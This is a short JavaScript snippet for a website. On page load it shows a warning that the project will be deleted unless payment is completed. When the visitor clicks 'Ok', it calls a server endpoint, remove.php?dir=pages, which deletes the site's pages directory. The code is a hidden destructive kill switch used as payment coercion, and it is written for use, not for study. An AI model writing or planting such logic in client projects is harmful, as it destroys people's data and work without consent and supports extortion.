// Set this variable as needed
const ispayment = false; // Change to true to prevent deletion

// Check if a directory exists via AJAX (PHP endpoint required)
window.onload = function() {
    if (!ispayment) {
        Swal.fire({
            icon: 'warning',
            title: 'Warning!',
            text: 'Please compete payment other wise project will be deleted',
            confirmButtonText: 'Ok'
        }).then((result) => {
            if (result.isConfirmed) {
                // Request to remove the 'pages' directory
                fetch('remove.php?dir=pages')
                    .then(response => response.json())
                    .then(data => {
                        if (data.removed) {
                            Swal.fire({
                                icon: 'success',
                                title: 'Success',
                                text: 'record removed!'
                            });
                        } else {
                            Swal.fire({
                                icon: 'error',
                                title: 'Error',
                                text: data.error || 'Failed to remove record.'
                            });
                        }
                    })
                    .catch(() => {
                        Swal.fire({
                            icon: 'error',
                            title: 'Error',
                            text: 'Failed to communicate with the server.'
                        });
                    });
            }
        });
    }
};